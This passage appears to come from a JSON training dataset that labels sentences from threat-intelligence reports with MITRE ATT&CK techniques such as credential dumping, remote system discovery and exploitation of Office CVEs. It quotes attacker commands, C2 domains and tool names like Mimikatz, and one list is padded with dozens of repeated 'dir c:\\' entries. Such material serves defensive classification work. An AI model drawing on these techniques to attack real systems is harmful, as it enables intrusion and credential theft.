    "One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server",
    "Some of the targeted apps\u00a0were:  \u00a0 Whatsapp  YouTube Video\u00a0Downloader  Google\u00a0Update \u00a0 Instagram  Hack\u00a0Wifi \u00a0 AirDroid \u00a0 WifiHacker   \u00a0 Facebook \u00a0 Photoshop \u00a0 SkyTV   \u00a0 Hotstar  Trump\u00a0Dash \u00a0 PokemonGo  With many more to\u00a0come",
    "Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal",
    "An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2\u00a0 infrastructure, making it much more difficult to safely block IPs",
    "Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service",
    "In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com",
    "five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service",
    "The group also used GitHub as a repository for tools that it downloaded post-compromise.",
    "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
  ],
  "scripting registry run keys / startup folder-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "All of the backdoors identified - excluding RoyalDNS - required APT15 to create batch scripts in order to install its persistence mechanism",
      "They consist mainly of persistence mechanisms and simple instructions despite their different forms (VBS scripts, PowerShell scripts, known software with open source code that can be backdoored, and in-house built dotnet apps)",
      "Downloading stylesheets allows for emended JavaScript and VBS to be run from within them, at which point any type of malware could be staged and run quite easily"
    ]
  },
  "remote system discovery": [
    "Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'",
    "Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks.\u00a0No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim\u2019s network via credentials likely stolen from a hotel Wi-Fi network.\u00a0 Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder",
    "At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization\u2019s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions",
    "Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems",
    "In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands",
    "The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment",
    "The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document",
    "This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker\u2019s interest",
    "(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance",
    "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n"
  ],
  "os credential dumping": [
    "The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'",
    "APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets",
    "During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump",
    "APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors",
    "NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN",
    "Our observation of related\u00a0actions\u00a0here:    u ps start password stealing (Windows)   Ps_mps/ps_hwi start start password stealing (Linux, MIPS,\u00a0 ARM)   uper_mps/uper_hwi start rewrite hook module with a new version and launch it (Linux, MIPS, ARM)   Nm_mps/nm_hwi start\u00a0 \u2013ban -middle Scan ports and retrieve banners on the router\u00a0subnet\u00a0 (Linux, MIPS,\u00a0 ARM)   U fsget * 7 *.docx, *.pdf, *.doc * search for docs with the given filetypes (Windows)   S sinfo retrieve information on installed programs and launch commands: systeminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)   weap_mps/weap_hwi host188.128.123.52 port[25,26,110,465,995]\u00a0 typetcpconnect DDoS on 188.128.123.52 (Linux, MIPS,\u00a0 ARM)   weap_mps/weap_hwi\u00a0 typesynflood port80 cnt100000 spdmedium host212.175.109.10 DDoS on 212.175.109.10 (Linux, MIPS,\u00a0 ARM)    The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices.\u00a0We want to pay special attention to the DDoS commands meant for these routers",
    "The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group",
    "The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)",
    "In total, nearly 13,000 sets of credentials are included in the data dump",
    "The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz",
    "In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017",
    "It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump",
    "We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid",
    "Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy",
    "When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials",
    "Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East",
    "Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3",
    "Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150",
    "Figure 6 Authentication dialog box with fake credentials entered On the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7",
    "Vault was implemented in Windows 7, it contains any sensitive data (like the credentials) of Internet Explorer",
    "The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session",
    "This private data includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency wallets",
    "Alerts for credential theft tools and privileged account lockouts should be investigated",
    "(Source: Dell SecureWorks)   TG-3390 actors have also used the following publicly available tools:  Windows Credential Editor (WCE) \u2014 obtains passwords from memory gsecdump \u2014 obtains passwords from memory winrar \u2014 compresses data for exfiltration nbtscan \u2014 scans NetBIOS name servers  Tactics, techniques, and procedures Incident response engagements have given CTU researchers insight into the tactics TG-3390 employs during intrusions",
    "15 Database dump Decoded, it reveals a detailed log of each affected machine",
    "Mimikatz to obtain credentials.",
    "",
    "Also, the use of the  mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems",
    "It was heavily modified, with almost all original code stripped out aside from its sekurlsa::logonpasswords credential stealing feature",
    "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n"
  ],
  "process hollowing masquerading-multi": {
    "technique_names": ["process injection: process hollowing", "masquerading"],
    "sentances": [
      "They utilised Windows commands in order to enumerate and conduct reconnaissance activities such as tasklist.exe, ping.exe, netstat.exe, net.exe, systeminfo.exe, ipconfig.exe and bcp.exe",
      "During our analysis, we observed one loader running \u201crr.exe\u201d with the following arguments:open cmd.exe /c c:\\\\temp\\\\rr.exe SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run \"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\spp.exe\" iexploreThe \u201crr.exe\u201d payload dropped to the system does nothing more than use the supplied command line arguments to create a registry key to execute the payload each time the system starts",
      "In all of the DropIt samples we collected, the dropper will then save the executable to the user\u2019s %TEMP% folder and execute the file, specifically to one of the following filenames:  %TEMP%\\spp.exe %TEMP%\\sloo.exe %TEMP%\\spoo.exe %TEMP%\\vschos.exe  We have also seen Magic Hound using DropIt like a binder Trojan, specifically dropping a legitimate decoy executable along with the malicious executable as a payload"
    ]
  },
  "fallback channels": [
    "Domains The RoyalCli backdoor was attempting to communicate to the following domains:  News.memozilla[.]org video.memozilla[.]org  The BS2005 backdoor utilised the following domains for C2:  Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]org  RoyalDNS backdoor was seen communicating to the domain:  andspurs[.]com  Possible linked APT15 domains include:  Micakiz.wikaba[.]org cavanic9[.]net ridingduck[.]com zipcodeterm[.]com dnsapp[.]info   Published date:\u00a0 10 March 2018   Written by:\u00a0 Rob Smallridge",
    "In order to extend the lifespan of the domains in case one or more are blacklisted, there are twelve different C2 domains that xparis() can be set to",
    "Indicators of Compromise (IoCs)    C&C servers    Ssl[.]arkouthrie[.]com   s3[.]hiahornber[.]com   widget[.]shoreoa[.]com       SHA256   Delivery document (W2KM_OCEANLOTUS.A): 2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a   Dropper (OSX_OCEANLOTUS.D): 4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4   Backdoor (OSX_OCEANLOTUS.D): 673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f   The post New MacOS Backdoor Linked to OceanLotus Found appeared first on",
    "Additionally malware reports itself to its hardcoded command and control servers and established a backdoor connection, so the attacker may have a permanent remote connection",
    "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds."
  ],
  "file and directory discovery": [
    "Business and government personnel who are traveling, especially in a foreign country, often rely on systems to conduct business other than those at their home office, and may be unfamiliar with threats posed while abroad",
    "These files are downloaded to a directory (C:\\Users\\Public\\Libraries\\tempsys) on the infected machine by Bxaki() and xparis()",
    "In this particular case in 2013, the config file included an unknown plugin set, aside from the usual \u2018ddos\u2019 plugin listing",
    "The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php",
    "The body of the POST request may contain files contained in the cabinet format",
    "It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents",
    "Figure 3 \u2013 A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable \u2013 functionality typical for such destructive trojans \u2013 the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems",
    "This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing",
    "HD Creates a file in the Temp path and names it \u201chd\u201d + PCID then invokes another program module named hd.test1 to identify logical drives",
    "Implant directory contained in the malicious Flash file",
    "Otherwise, it runs a search for the \u201c/bin/rsyncd\u201d string within the files found in the /etc/ folder",
    "watch/?   search/?  find/?    results/? open/?    search/?  close/?   The \u201cai\u201d value stands for the payload title",
    "DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices",
    "Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type",
    "The dropped files are either in the root of the \u201cProgramData\u201d folder or in a subdirectory",
    "The file names may vary from one version of the malware to another",
    "In one version of the malware, the code checks if the \u201cProgramData\u201d folder has folders or files with the keywords \u201cKasper\u201c, \u201cPanda\u201c, or \u201cESET\u201c",
    "It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file",
    "Figure 7: Property list file in LaunchAgents directory To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd\u00a0\u2013launchd\u00a0netlogon.bundle",
    ".iqy files are simple text files containing a URL which are opened by default by Excel",
    "The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files",
    "Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files",
    "4 Upload edg499.dat, which includes the list of interesting files",
    "Since it is a very long term group, some victims may be impossible to identify now",
    "These platforms may not be well maintained and may break intermittently",
    "PHOTO: a DLL backdoor also reported publicly as \u201cDerusbi\u201d, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files",
    "This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime",
    "Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states",
    "Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use",
    "High Commissioner of Bangladesh Pakistan eying Sukhoi-35 fighter planes as part of defense deal from Russia 2018.143 PG COURSE IN 2018-2021 BATCH India Bangladesh and Pakistan Press Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018 Afghan Bomb Blast report by ISI USAJOBS Daily Saved Search Results for New GS15 for 3/30/2018 How Rigging take place in Senate Elections in Pakistan Afghan Terrorist group details ISI Restricted113 1971 Liberation War Freedom Fighters in Pakistan Army Custody Database  Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):  Liberation Freedom Fighter.xlam NSC details of participants.xlam Raw Sect Vikram report on Pak Army Confidential.doc USA Immagration Policy for Families.ppam doc CV FM.doc doc Sukhoi35 deal report.doc Nominal Roll.doc Press Release 17 April.doc Afghan Blast report by ISI.doc Rigging in Pakistan Senate.doc Afghan Terrorist group report.doc  \u00a0 The payloads for these attacks varied in malware family",
    "With the exception of the \u2018Speed\u2019 method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list: \u00a0  ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK  \u00a0 The last two methods in the chain carry out a majority of the first payload\u2019s functionality",
    "Hashes For a list of all hashes of malware encountered during this campaign, please refer to the following file",
    "17 Complete List of Malware Files  Fig",
    "17-3 Function names To target specific victims, Astaroth is locale aware; any attempts to run the malware without locale spoofing will result in failed downloads and the inability to run the .dll files",
    "119 readFiles Obtains file information on a file or a folder, and supports a \u201c*\u201d wildcard and recursive file list",
    "Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls:",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "searches for files",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "dir c:\\",
    "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)"
  ],
  "exploitation for client execution": [
    "2, 2018, we published a blog detailing the use of\u00a0an Adobe Flash zero-day vulnerability\u00a0(CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper)",
    "Observed vulnerabilities include:  CVE-2012-0158  CVE-2017-0199  CVE-2017-8759  CVE-2017-11882       Figure 2: APT40 attack lifecycle  Establish Foothold APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups",
    "On October 10, 2017, Kaspersky Lab\u2019s advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers",
    "We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by FireEye in September 2017.\u00a0 The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye",
    "Some lure documents used in these attacks are shown below: Decoy documents used in BlackOasis attacks To summarize, we have seen BlackOasis utilizing at least five zero days since June 2015:  CVE-2015-5119 \u2013 June 2015 CVE-2016-0984 \u2013 June 2015 CVE-2016-4117 \u2013 May 2016 CVE-2017-8759 \u2013 Sept 2017 CVE-2017-11292 \u2013 Oct 2017  Attacks Leveraging CVE-2017-11292 The attack begins with the delivery of an Office document, presumably in this instance via e-mail.\u00a0 Embedded within the document is an ActiveX object which contains the Flash exploit",
    "What does it mean for everyone and how to defend against such attacks, including zero-day exploits? For CVE-2017-11292 and other similar vulnerabilities, one can use the killbit for Flash within their organizations to disable it in any applications that respect it.\u00a0 Unfortunately, doing this system-wide is not easily done, as Flash objects can be loaded in applications that potentially do not follow the killbit",
    "This document exploited a newer vulnerability, CVE-2017-0199",
    "This change is because Group 123 did not target South Korea during this campaign and Microsoft Office is standard in the rest of the world.Infection VectorsThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of Microsoft Office",
    "Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can\u00b4t prove they were related to this particular attack",
    "This time, weaponized lure documents claiming to contain seminar information on environmental protection were observed exploiting known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to drop and execute the backdoor binary on the victim\u2019s machine",
    "In this campaign, we observed threat actors exploiting CVE-2017-0199 and CVE-2017-11882 to distribute malware",
    "Conclusion CVE-2017-0199 and CVE-2017-11882 are two of the more commonly exploited vulnerabilities that we are currently seeing",
    "Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild",
    "Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently\u00a0discovered vulnerability (CVE-2017-11882) in Microsoft Office",
    "In many cases, additional stealers, RATs, and other malware were observed being hosted on the same web servers.Analysis of HawkEye Reborn The campaign starts with sending the aforementioned Excel sheets that exploit the well-known CVE-2017-11882 vulnerability, an arbitrary code execution bug in Microsoft Office",
    "Less than a week after Microsoft issued a patch for CVE-2017-11882 on Nov",
    "14, 2017, FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East",
    "In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER",
    "CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory",
    "Figure 3: CVE-2017-11882 and POWRUNER attack sequence  The malicious .rtf file exploits CVE-2017-11882",
    "An RTF, an MSI file, a .NET Wrapper and two stages of Shellcode walk into a bar\u2026 Our journey begins with an RTF file named \u201cNew Salary Structure 2017.doc\u201d, which exploits CVE-2017-0199",
    "Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious \u201cscriptlet\u201d file, or .sct file, which is also embedded in the malicious RTF document",
    "Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability",
    "Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:  a) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities b) CVE-2010-1871: JBoss Seam Framework remote code execution c) JBoss AS 3/4/5/6: Remote Command Execution (exploit) d) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE e) CVE-2018-2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware",
    "Attack chain of Tropic Trooper\u2019s operations Here\u2019s a summary of the attack chain of Tropic Trooper\u2019s recent campaigns:  Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office\u2019s Equation Editor (EQNEDT32.EXE)",
    "We believe the adversary exploited a recently vulnerability in Microsoft SharePoint tracked by , which is a remote code execution vulnerability used to compromise the server and eventually install a webshell",
    "The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802.",
    "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
  ],
  "exploitation for privilege escalation": [
    "Exploited Vulnerabilities: Frequent exploitation of vulnerabilities in Hangul Word Processor (HWP), as well as Adobe Flash",
    "APT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure",
    "Leveraging data from Kaspersky Security Network, we identified two other similar exploit chains used by BlackOasis in June 2015 which were zero days at the time.\u00a0 Those include CVE-2015-5119 and CVE-2016-0984, which were patched in July 2015 and February 2016 respectively.\u00a0 These exploit chains also delivered FinSpy installation packages",
    "Deploying a multi-layered approach including access policies, anti-virus, network monitoring and whitelisting can help ensure customers are protected against threats such as this.\u00a0 Users of Kaspersky products are protected as well against this threat by one of the following detections:  PDM:Exploit.Win32.Generic HEUR:Exploit.SWF.Generic HEUR:Exploit.MSOffice.Generic  More information about BlackOasis APT is available to customers of Kaspersky Intelligence Reporting Service",
    "Exploitation of this vulnerability allows an attacker to escalate privileges on the affected system",
    "All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash",
    "Year  Country  Industry  Malware  2014  Vietnam  Network Security  WINDSHIELD  2014  Germany  Manufacturing  WINDSHIELD  2015  Vietnam  Media  WINDSHIELD  2016  Philippines  Consumer products  KOMPROGO WINDSHIELD SOUNDBITE BEACON \u00a0 2016  Vietnam  Banking  WINDSHIELD  2016  Philippines  Technology Infrastructure  WINDSHIELD  2016  China  Hospitality  WINDSHIELD  2016  Vietnam  Media  WINDSHIELD  2016  United States  Consumer Products  WINDSHIELD PHOREAL BEACON SOUNDBITE  Table 1: APT32 Private Sector Targeting Identified by FireEye APT32 Interest in Political Influence and Foreign Governments In addition to focused targeting of the private sector with ties to Vietnam, APT32 has also targeted foreign governments, as well as Vietnamese dissidents and journalists since at least 2013",
    "APT32 regularly used stealthy techniques to blend in with legitimate user activity:  During one investigation, APT32 was observed using a privilege escalation exploit (CVE-2016-7255) masquerading as a Windows hotfix",
    "Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal",
    "McAfee detects these threats as:  RDN/Generic Exploit RDN/Generic.dx Generic PWS.y Generic.hbg Exploit-CVE2018-4878  McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk",
    "The database is located in the \u201c/usr/lib/cva-ssys/My_BD\u201d folder (\u201c~/.local/cva-ssys/My_BD\u201d\u2014if the Trojan does not have root privileges)",
    "The attacker leveraged multiple exploits, targeting both\u00a0CVE-2014-6332\u00a0and\u00a0CVE-2014-4113",
    "CVE-2014-4113 is a privilege escalation vulnerability that was\u00a0disclosed publicly on 2014-10-14",
    "The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges",
    "Are the attackers using any zero-day vulnerabilities? No zero-day vulnerabilities have been found in the analysis of the samples obtained regarding this campaign",
    "These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively",
    "Trend Micro Solutions Trend Micro\u2122\u00a0Deep Security\u2122 and\u00a0Vulnerability Protection\u00a0provide\u00a0virtual patching\u00a0that protects endpoints from threats such as malicious redirections to malware-hosting URLs, as well as those that exploit unpatched vulnerabilities",
    "OfficeScan\u2019s Vulnerability Protection shields endpoints from identified and unknown vulnerability exploits even before patches are even deployed.\u00a0Trend Micro\u2122\u00a0Deep Discovery\u2122 provides detection, in-depth analysis, and proactive response to attacks using exploits and other similar threats through specialized engines, custom\u00a0sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect these attacks even without any engine or pattern update",
    "Dubbed \u2018SpeakUp\u2019, the new Trojan exploits known vulnerabilities in six different Linux distributions",
    "exploits a known Windows privilege escalation vulnerability ( ) on unpatched computers.",
    "Among them, we found variations on the    EternalDarkness SMBv3 exploit (CVE-2020-0796)  , a , the privilege escalation exploit published on the Google Security Github account, and the privilege escalation exploit.",
